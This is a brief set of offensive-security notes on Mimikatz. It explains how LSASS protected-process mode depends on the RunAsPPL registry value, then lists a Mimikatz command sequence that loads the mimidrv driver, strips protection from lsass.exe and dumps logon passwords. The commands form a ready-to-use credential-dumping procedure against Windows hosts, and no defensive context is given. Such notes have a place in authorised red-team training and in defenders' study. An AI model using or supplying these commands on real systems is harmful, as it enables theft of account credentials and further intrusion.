#mimikatz 
[LSASS](../AD%20Basics/Credentials.md#LSASS)
- `lsass.exe` is a protected process. 
### Disabling lsass protection
- Microsoft made lsass.exe a protected process so that it can't be used to dump credentials.
- The lsass protection depends on the registry key `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`. If the `RunASPPL` is set to `1`, lsass protection is enabled.
- Mimikatz can also be used to disable lsass protection. Requires mimidrv to access kernel level access
```powershell
# load mimidrv
!+
# remote protection
!processprotect /process:lsass.exe /remove
# dump credentials
sekurlsa::logonpasswords
```